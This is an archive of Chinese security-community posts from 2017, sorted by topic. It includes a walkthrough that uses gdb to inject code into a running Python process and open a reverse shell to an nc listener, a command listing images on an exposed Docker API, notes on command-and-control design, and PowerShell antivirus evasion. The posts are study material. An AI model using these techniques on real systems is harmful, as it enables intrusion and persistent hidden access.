超简单来说，区块链之上有匿名货币，最知名的如比特币。各匿名货币有其特性，如：市场应用、开发团队、技术社区、背后财团等等。底层的区块链也不尽相同，由匿名货币的应用场景决定，技术细节都比较复杂，入门门槛不小，精通会更难。

最近我们研究了这个领域的安全，还是很有意思的，和钱直接挂钩。他们又非常欠缺整体安全经验，也许他们核心技术团队的密码学安全很强，但根本挡不住我们这些职业选手的测试。

年底有那么些忙，先这样。 [微笑]



<img src="https://images.zsxq.com/Fo-J66sSIo5Up8sdOkfHJ4omDdRw?imageMogr2/auto-orient/thumbnail/320x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:ZjEwTZHJ1V-DVkmo3TWr2xLcfc0=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.zsxq.com/d7/29/d729d2a416b5bcf16cff75467c015e15e69a065d9cc27391432191617f349caa.jpg" width="25px"/> __jin__:   wulujia也在本圈 [发呆]


...

---


## IP

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-05:

> 匿名用户 提问：
为什么路由器里状态显示的外网IP和从网页查询的公网IP不一样


traceroute 下，你的路由器外面说不定还有个真正的外网路由器



...

<img src="https://file.xiaomiquan.com/b7/f5/b7f5c4ac2c8c032c26ba4fd222cebd77a07b4d0d3ee27ac28e2e3ae8907fc59f.jpg" width="25px"/> __兜兜有糖不给你吃__: Tracert的瘟逗死，traceroute的Linux


...

---

## HTML



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-22:


__#基础#__

  HTML 自定义元素教程


[HTML 自定义元素教程 - 阮一峰的网络日志](http://www.ruanyifeng.com/blog/2017/06/custom-elements.html)



可以了解到：

+ 什么是自定义元素
+ HTML5/W3C/ES6
+ HTML Imports、HTML Template、Shadow DOM----统称为 Web Components 规范
+ React

了解 Web 当下利于我们研究安全。


---

## JS


<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-28:


__#基础#__

JavaScript 入门经典读书笔记

分享来自@Hi  

分享得很认真，30来页笔记，不容易，如果你需要发展前端黑，那么 JavaScript 是必备黑魔法，如果你想成为全栈黑客，JavaScript 也必须掌握。

脚踏实地，一步一步，成长才能稳！


__分享文件:__

[JavaScript 入门经典5th_Ch01-10.pdf](https://github.com/ChrisLinn/greyhame-2017/blob/master/shared-files/JavaScript%20%E5%85%A5%E9%97%A8%E7%BB%8F%E5%85%B85th_Ch01-10.pdf)


...

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 学习前端，有个好方式，找着百度ife前端学院的教程来，新手的话去看他们开设的第一期，是在github上的，比较初级

<img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 学jquery还用学js吗？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 当然啊，jQuery只是方便的js框架罢了，你不熟悉js怎么行

<img src="https://file.xiaomiquan.com/88/ba/88baf27d18a55ca81cb25b0279ab02127bac65f1d2a9cdfbc724c0cf7512f7e9.jpg" width="25px"/> __In&eRes7ing__: 目前正在看，很基础，但是也很考验人。基础不牢地动山摇啊

<img src="https://file.xiaomiquan.com/e1/13/e11323b87fbd14d11c8ed453e58d5e203cff855222009760643443f997682362.jpg" width="25px"/> __你慢慢的我先走__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: ife的报名不是已经截止了吗？怎么弄呢？

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/e1/13/e11323b87fbd14d11c8ed453e58d5e203cff855222009760643443f997682362.jpg" width="25px"/> __你慢慢的我先走__: 不用报名，跟着它们的节奏来学，看第一期和第二期


...

---


## Docker



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-01:


__#姿势#__

有玩 Docker 的同学可以关注这份 Docker 安全部署指南：


[GitHub - GDSSecurity/Docker-Secure-Deployment-Guid...](https://github.com/GDSSecurity/Docker-Secure-Deployment-Guidelines)



这份指南罗列了 Docker 在部署上如果不注意可能会出现的严重安全问题。对这块攻击感兴趣的也可以了解下。

Docker 是非常棒的轻量级虚拟化隔离解决方案，但还不是真正的虚拟机，所以安全上会有不少特别的学问。

我们玩黑的，Docker 有两个研究出发点：

1. 很多安全工具的部署，用 Docker 可以一键安装，非常方便，比如 Kali 可以这样去安装：

`docker pull kalilinux/kali-linux-docker`

Metasploit 可以这样去安装：

`docker pull remnux/metasploit`

是不是非常方便？随时随地，用后即删。

2. Docker 本身在部署上如果没做好，是可以黑掉实体机的，还可以恶意操作 Docker 的一些部署行为。

比如之前研究过 Docker 集群管理里的 2375/2376 端口，如果可以被外网访问到，就糟糕了，如列出所有 images：

`docker -H 219.2.213.12:2375 images`

然后之后还可以执行一系列 Docker 的操作指令，邪恶点可以写个 Docker 蠕虫传播起来。😏

也许会有那么一天，Docker 蠕虫/勒索事件爆发。回到开头，Docker 的安全性得做好，从安全部署习惯开始！



...

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 已经改名叫moby了

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 参考这段：“Docker改名为Moby了吗？答案已经很明确了，Docker仍然还在，仍然还叫Docker。只是Moby项目已经问世，它是Docker的上游项目，是Docker之母。正因如此，Docker这个名字也已经不适合作为原来源码库的名字了。而对于普通的容器个人使用者或者企业，影响并不是太大。对于一些容器系统厂商和组件提供方，Moby提供了一种新形式的协作平台，可以定制化、增强、适配容器系统等等。”

...

---

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ on 2017-07-01:


__#资源#__

一个使用 docker 部署 Web 漏洞测试环境的github项目，测试环境可随时创建随时删除，十分方便

项目地址：
[GitHub - MyKings/docker-vulnerability-environment:...](https://github.com/MyKings/docker-vulnerability-environment)



环境列表：

+ bWAPP
+ xssed
+ DVWA
+ WebGoat
+ DVWA-WooYun-edition
+ DSVW
+ WAVSEP
+ OWASP Broken Web Applications Project(未完成)


---


## Python



<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__ on 2017-07-03:


__#Python安全开发打怪升级之路#__


前言:前几天看到@Aodongq1n的一个提问，主要表达意思是东西内容过多，节奏感跟不上。后来我就想是否知识过于零碎，然后会不会让人产生方向感模糊，从而望而却步呢。首先这个问题可能会存在的，也是正常的，因为学习觉得可以分为两种分支进行，一根是自己的主线进行系统化学习，还有一根是扩宽自己的知识面查漏补缺(在这个过程发现到自己感兴趣的就可以尝试，不感兴趣的作为普及)；零碎有零碎的好处可以快速掌握知识，快速解决问题，对于有基础的是很好的查漏补缺的方法，但是如果面对不太了解的，可能会出现方向感不稳；系统其实不是心里面想的那种多么系统多么系统，系统化是个路线，具体这个路线哪边重哪边轻这个需要自己把握，这样的缺点时间比较长，但是一步步跟下来不容易失去方向感。我自己是做安全方面的开发，所以根据工作的场景，我暂时分享的关联性路线是
Python普通语法、Pythonic、Python安全开发常用模块、Poc等安全工具编写、Python爬虫。
这4块主要分享个人Python打怪过程中的笔记，所以可能会存在一定口语化、格式化简陋或者理解的错误，希望大家帮忙指正。谢谢！
PS:更多的是总结，所以可能有的地方不会很细，建议配合廖雪峰的教程，参考这份然后记录成自己的内容。


__分享文件:__

[Python基础笔记1-10章.pdf](https://github.com/ChrisLinn/greyhame-2017/blob/master/shared-files/Python基础笔记1-10章.pdf)


...

<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__: 附一个导航页，节约时间
[安全导航](http://coco413.com/SecNavi/)

...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-04:


__#姿势#__

 如何给正在运行的 Python 进程注入后门连接

今天分享个昨晚玩的姿势，首先这个姿势来源这个开源项目 pyrasite：

[GitHub - lmacken/pyrasite: Inject code into runnin...](https://github.com/lmacken/pyrasite)



这个项目介绍是：Inject code into running Python processes，之前@Moriarty 推荐过这个好工具。

但是我这不是要介绍这个工具的用法，用法直接看其官网的视频（pyrasite.com），一目了然。

我昨晚读了一遍 pyrasite 源码，很快就明白了本质的原理，这里给大家分享下（以 Linux 环境下的情况为例，需要 root 权限）。其实关键语句就这句：

```
gdb -p 3142 --batch -eval-command='call PyGILState_Ensure()' -eval-command='call PyRun_SimpleString("print(\"hiworld\")")' -eval-command='call PyGILState_Release($1)'
```

对，gdb，这是经典的调试神器了，玩过 gdb 的都知道，这个神器支持直接对目标进程运行态进行动态调试，不过这有个前提，需要开启：

`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`

开启后，如上那条 gdb 语句，-p 参数背后跟目标 Python 进程的 pid，我这里测试的是 3142，然后 `-eval-command` 是注入需要执行的命令，仔细看有几个 `-eval-command`，这些命令会顺序执行，最终执行的是 PyRun_SimpleString 函数里的 Python 代码：

`print("hiworld")`

好，现在可以注入 Python 代码，打印 hiworld 了，那么我们注入个反弹到我们的远程 nc 吧。

```
gdb -p 3142 --batch -eval-command='call PyGILState_Ensure()' -eval-command='call PyRun_SimpleString("exec(open(\"back.py\").read())")' -eval-command='call PyGILState_Release($1)'
```

其中，back.py 就是一个反弹脚本，反弹连接到我们的 nc 监听上：

`nc -l -p 1134 -vv`

效果如图所示，相关测试脚本见附件，简单说明下：

t.py 是目标进程，back.py 是反弹脚本，都在 test.zip 里。

[后记]

1. 进程注入，gdb 的这种用法大家可以开脑洞，那么其他类型的进程我们是否也可以这样优雅地注入？
2. 我们在用一些优秀的工具时，不应该只停留在只会用，如果有源码，我们可以读通其源码，看看作者的思路，是个非常好的学习机会。而且这样下来，你其实比只会用用而已的人更能驾驭这款工具的高阶姿势。
3. 工欲善其事必先利其器，这也是为什么本圈会介绍些优秀工具的用法或剖析。

<img src="https://images.xiaomiquan.com/FhjYwyDP9bQ70k62Z865kgNT5sEy?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:qJwkqNZR070Utu72QpvX61CM3YM=" width="50%" height="50%" align="middle"/>

<img src="https://images.xiaomiquan.com/Fre61g-QQP25C6LpeNViNu8rco9i?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:dI__gGgAbp-dh0laadkojccPZYI=" width="50%" height="50%" align="middle"/>

<img src="https://images.xiaomiquan.com/Fsq67FFptePGDtB_Qxe5cNwiAYgj?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:jYtsyELcJrPuCMd2wEuWbg14Ak8=" width="50%" height="50%" align="middle"/>

__分享文件:__

[test.zip](https://github.com/ChrisLinn/greyhame-2017/blob/master/shared-files/test.zip)


...

<img src="https://file.xiaomiquan.com/c6/19/c619f2f8272cce087de22a13bf084787e929efee10e32381acfb833c8b9a7b3e.jpg" width="25px"/> __乌鸦__: 不是做安全的，但搞过php进程的注入，思路类似，写一段py脚本（gdb提供py接口的包装），使用gdb执行～

`eval "gdb --batch -nx ${PHP_BIN} ${PHP_PID} -ex \"source ${PY_SCRIPT_FILE}\" 2>/dev/null"`

另外有有一些库可以动态注入机器码或者so文件，比如linux-inject，安卓上有人用这种技术做坏事，原理本质上一样，都是用了ptrace系统调用，有的软件做了反调试的话，需要想方法绕过～

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/c6/19/c619f2f8272cce087de22a13bf084787e929efee10e32381acfb833c8b9a7b3e.jpg" width="25px"/> __乌鸦__: 😄赞

<img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 现在生产环境中有多少服务器中安装了gdb呢？占的比例大概有多少？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 不好说

...

---

<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__ on 2017-10-09:


__#Python安全开发打怪升级之路#__

接下来的话主要分享一些有用标准库和安全开发过程中使用的比较多的模块。


__分享文件:__

[Python基础-二.pdf](https://github.com/ChrisLinn/greyhame-2017/blob/master/shared-files/Python基础-二.pdf)


...

<img src="https://file.xiaomiquan.com/74/ab/74abebf3530d1f6750d72fe7669a6d76f77779d6c66552a6a545521b66fee4fc.jpg" width="25px"/> __I0ck_me__: 赞一个


...

---


## Openwrt



<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-07-21:


__#姿势#__

爱折腾之将你的路由器刷成openwrt

爱好安全的同学应该都喜欢折腾，一个不错的折腾方式，将你的路由器系统刷成一个开放式的嵌入式linux发行版。

然后你可以在这个路由器上：
挂在一个轻量型的web服务器、进行脱机下载、FTP服务器、安装去广告插件、科学上网、安装python，如果你的线路支持，还可以进行多拨，增加你的带宽，你可以安装python，只要你脑洞够大，拿来做啥都可以，甚至拿来接收shell。

它是采用opkg的软件包管理技术，类似于CentOS下的yum，可以实现对预编译的二进制软件下载。
说白了它可以让你的路由器变成一个小型的linux工作站，然后又没噪音，耗电量又少，是不是挺有意思！

其实我当初接触linux就是从我家路由器刷机开始的，自己整天百度折腾了一个小博客放在上面，然后用iptables防火墙来管理家里内网，这个过程我慢慢去学linux方面的知识。
不断折腾是学习的最好方式，对知识的记忆是最深刻的。

其实国内大多数智能路由都是从OpenWrt的基础上改的，只是没有开放而已。

开始折腾从百度：“你的路由器型号刷OpenWrt教程" 这个关键字开始。



[http://wiki.openwrt.org/toh/start](http://wiki.openwrt.org/toh/start)

这里看路由器支持信号列表，基本是智能路由器都可以。

[博客 - UMU Corporation](https://my.oschina.net/umu618/?sort=time&catalog=269802&p=3)

这个作者写了一系列的折腾日记。

[如何从零开始学习OpenWrt？ - 知乎](https://www.zhihu.com/question/23363243)

这里有个答案比较全，其中youtube链接上有中文的视频，适合深入。

<img src="https://images.xiaomiquan.com/Fi23xYdja3zhVpZUhC1xx0QNTkds?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:4eNgQNY8Rf6HRWyoaQYrlO9A1GY=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 嘿嘿，如果你有路由器支持双wan，你可以用一个一般的路由器做个无线中继来将你邻居网络共享过来，然后接入到你的一个wan口，实现和你自己的宽带重叠，加大带宽😏，老司机也完全不用自己拉宽带了😜

<img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 曾经有段时间很想用双wan口叠加带宽，后来发现双wan口的家用路由不多，基本上都是企业级的才有，价格不菲啊！

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__: 一般是企业级的才有，便宜的三百多吧

<img src="https://file.xiaomiquan.com/66/01/660104bd6b28762521f973581f028cc6e49e98159b6d3614aa96a4d64ee52a33.jpg" width="25px"/> __(月半)Al3x~__ replies to <img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__: 多拔还要看运营商玄学

<img src="https://file.xiaomiquan.com/66/01/660104bd6b28762521f973581f028cc6e49e98159b6d3614aa96a4d64ee52a33.jpg" width="25px"/> __(月半)Al3x~__: 刚刷的梅林7.5，别诱惑我又去刷openwrt😂

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/66/01/660104bd6b28762521f973581f028cc6e49e98159b6d3614aa96a4d64ee52a33.jpg" width="25px"/> __(月半)Al3x~__: 哈哈，梅林7.5没刷过，不是openwrt最有名吗？尽量还是刷大品牌，很多大牛在用，走后门几率小

<img src="https://file.xiaomiquan.com/66/01/660104bd6b28762521f973581f028cc6e49e98159b6d3614aa96a4d64ee52a33.jpg" width="25px"/> __(月半)Al3x~__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 以前刷过openwrt，WiFi模块有点问题，就转回去最慢的netgear固件。等有个副路由再折腾，断网太难受😂

<img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__ replies to <img src="https://file.xiaomiquan.com/66/01/660104bd6b28762521f973581f028cc6e49e98159b6d3614aa96a4d64ee52a33.jpg" width="25px"/> __(月半)Al3x~__: 嗯！成都电信的家用200M光纤可以支持4次同账号拔号，我家猫现在接出来的三条线都是独立拨号，独享带宽的，哇咔咔！😏

...

---


## Command and Control


<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-07-25:

介绍几种cc的设计
1.直接用单一IP地址
好处：简单易用
坏处：容易封禁

2.单一域名
好处：也很简单，被封了再申请一个
坏处：要经常换，免费域名一看就很可疑
例如3322.org

3.多域名+按时更换IP
好处：组合多不大容易被封
坏处：费钱

4.DGA算法
好处：高级CC的主流技术，便宜实用
坏处：随机性字符串域名无法抵御语义分析

5.变形DGA算法
好处：老子再也不怕语义分析啦
坏处：费脑子想个迷惑性强的字典

6.boss+杂兵双层CC
好处：杂兵要多少有多少，每一段时间boss就给派新一批杂兵，找不到boss就很难封锁
坏处：如果boss被抓。。。另外DNS查询量太异常

7.利用论坛发帖，爬取CC指令
好处：隐蔽性好，容易蒙过安全检测人员，尤其是你的指令又很迷惑的情况下
坏处：当论坛版主是个黑客。。。

8.平常无外联，需要时才分配CC
好处：这个厉害了，基本不会被发现
坏处：技术要求高。怎么分配呢？这个见仁见智😝

9.评论区补充



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: dropbox telegram 等都是常用的“中转”

<img src="https://file.xiaomiquan.com/d7/70/d770925d03a48166661a8101018a4f33a3ee1cf3922d704d4330cbdc5b28b58a.jpg" width="25px"/> __jiayu__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 还见过新浪博客和QQ空间的

<img src="https://file.xiaomiquan.com/d7/70/d770925d03a48166661a8101018a4f33a3ee1cf3922d704d4330cbdc5b28b58a.jpg" width="25px"/> __jiayu__: 第8种没看太懂，求分享细节😆

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ replies to <img src="https://file.xiaomiquan.com/d7/70/d770925d03a48166661a8101018a4f33a3ee1cf3922d704d4330cbdc5b28b58a.jpg" width="25px"/> __jiayu__: 举个例子，你的马平时不主动外连，而是监听某一特定端口，当你要激活它时往这个端口发一个特定内容的包来激活，然后再给它分配一个临时的cc，完事以后解除绑定的cc，继续潜伏😘

<img src="https://file.xiaomiquan.com/d7/70/d770925d03a48166661a8101018a4f33a3ee1cf3922d704d4330cbdc5b28b58a.jpg" width="25px"/> __jiayu__ replies to <img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__: 学习了👍


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-05:


__#姿势#__

强烈推荐看看这篇 Paper，Koadic (C3) 这个新远控设计思路与功能，这是一款高级 JScript/VBScript 远控，对比了经典的 Meterpreter 和 Empire。最重要的是这个远控是开源的：

[GitHub - zerosum0x0/koadic: Koadic C3 COM Command & Control - JScript RAT](https://github.com/zerosum0x0/koadic)



玩 Win 渗透的同学可以好好看看，其实 Paper 本身简单，工具用起来也简单。


__分享文件:__

[DEFCON25_Koadic C3_COM Command Control.pdf](https://github.com/ChrisLinn/greyhame-2017/blob/master/shared-files/DEFCON25_Koadic%20C3_COM%20Command%20Control.pdf)


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-24:


__#HITB#__

A Year In The Red，这个 PPT 含金量挺高的，不过很多细节还是得自己去玩。

里面介绍了他们及别人研发的好工具，这都还好，里面的 Domain Fronting 技巧来做 C&C 隐蔽的可以关注看看，虽然之前我也研究过...

在听这个的时候，一位新西兰老外问我们 Red Team 在中国怎么叫，我们说：红队。

Red Team 的叫法流行了，我们就是以 Red Team（攻击）的出发点去做 Blue Team（防御）的事。

下午有事，不直播了，不过遇到什么好玩的会随时发。


__分享文件:__

[D1 - Dominic Chell and Vincent Yiu - A Year In The Red.pdf](https://github.com/ChrisLinn/greyhame-2017/blob/master/shared-files/D1%20-%20Dominic%20Chell%20and%20Vincent%20Yiu%20-%20A%20Year%20In%20The%20Red.pdf)


---


## 隐写



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-07:

> [§] 提问：
余大大，我想请教一下：我想用Python写一个可以批量检测图片是否隐藏了其他东西的工具，包括检测出使用的是何种隐写术，不知道这个想法能否实现，若可以实现，需要掌握哪些隐写术，可否提供一些参考资料学习学习。谢谢！


这个好问题，可惜我们没实战过，思路倒是可以去看看都有哪些隐写技术，知己知彼，比如 Freebuf 搜下隐写，好些文章。



...

<img src="https://file.xiaomiquan.com/53/d4/53d41a6bbe6cdc75e6cae97b4f98f74831772e6ce4086d2328d85cf643266f56.jpg" width="25px"/> __空白__: 
[GitHub - Owlz/stegoVeritas: Yet another Stego Tool](https://github.com/Owlz/stegoVeritas)

<img src="https://file.xiaomiquan.com/53/d4/53d41a6bbe6cdc75e6cae97b4f98f74831772e6ce4086d2328d85cf643266f56.jpg" width="25px"/> __空白__: 
[图片隐写术总结 – 850's Blog](http://850.world/2017/04/12/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF%E6%80%BB%E7%BB%93/#comment-4)

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/53/d4/53d41a6bbe6cdc75e6cae97b4f98f74831772e6ce4086d2328d85cf643266f56.jpg" width="25px"/> __空白__: Great

<img src="https://file.xiaomiquan.com/8b/f8/8bf8ed658903935055a1d9bc9b13cb9ff0ed77f145e07625f80765a1cc1da9c0.jpg" width="25px"/> __[§]__ replies to <img src="https://file.xiaomiquan.com/53/d4/53d41a6bbe6cdc75e6cae97b4f98f74831772e6ce4086d2328d85cf643266f56.jpg" width="25px"/> __空白__: 谢谢！学习学习


...

---

<img src="https://file.zsxq.com/1e4/ba/e4ba90534396ff4031351efdb6ac2330c6b3712d7791622660b49164a9c677e3.jpeg" width="25px"/> __Moriarty@ATToT__ on 2017-12-19:

__#LanT34m原创#__ 

由“Invoke-PSImage.ps1”谈谈powershell脚本的免杀 By Moriarty@LanT34m

今天看到了github上的一个新的项目“Invoke-PSImage”，一个可以将powershell脚本写入到一个PNG格式的图片文件里，并调用执行的工具。由于其使用了类似图片隐写的技术(但是图片大小是会有变化），因此可以很好的隐藏脚本代码同时又能起到免杀效果。那么今天我们就从这个工具说起，来谈谈powershell脚本的免杀技术。

文章完整地址： [From WizNote](http://18a9052c.wiz03.com/share/s/0oGgkI1xz4W62cA5dw0Iju0p1EsZBw3A3h7D2FR3kN13qpwM)

阅读密码： 5112


...

<img src="https://file.zsxq.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Scanr__: 利用其颜色的RGB代码隐藏payload  躲避ids/ips/av查杀   [通过BMP图像像素传输后门payload - 安全客，有思想的安全新媒体](https://www.anquanke.com/post/id/86058)

...

---


## Browser

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-09:


__#后门#__

关注下这个：

[大家注意了 Chrome 的插件 User-Agent Switcher 是个木马 - V2EX](https://www.v2ex.com/t/389340)

...

<img src="https://file.xiaomiquan.com/f7/9a/f79af1bde651a9dd2c989af5ff7daef5802563815d9456228954484c65760e60.jpg" width="25px"/> __岳锦文__: 我来补个图😄

<img src="https://images.xiaomiquan.com/FnBvxT4ntVkAItvr8q4aSlxX9ZoW?e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:ok2p2IT69C_RW4i6cOJgXiVy3Hg=" width="50%" height="50%" align="middle"/>

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/f7/9a/f79af1bde651a9dd2c989af5ff7daef5802563815d9456228954484c65760e60.jpg" width="25px"/> __岳锦文__: 😄

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这个后门太经典了：Canvas图片隐写+ES6语法糖+几个偏门技巧+多层混淆+变量加花。逆起来都眼花，不过确实吻合后门性质。

<img src="https://file.xiaomiquan.com/09/17/09173a8ddd903516f16515893f44703fd4de9ec901a54ac5deeccfe9db189fdd.jpg" width="25px"/> __BigBoy__: 之前调试产品的时候，莫名其妙的发现很多http请求，当时也是调试了很久才定位到是浏览器插件的问题，后来把Crx文件抓出来分析，代码都整理好了，有些代码混淆了没认真研究，就没发现恶意代码，原来是藏图片里了，哈哈，学习了

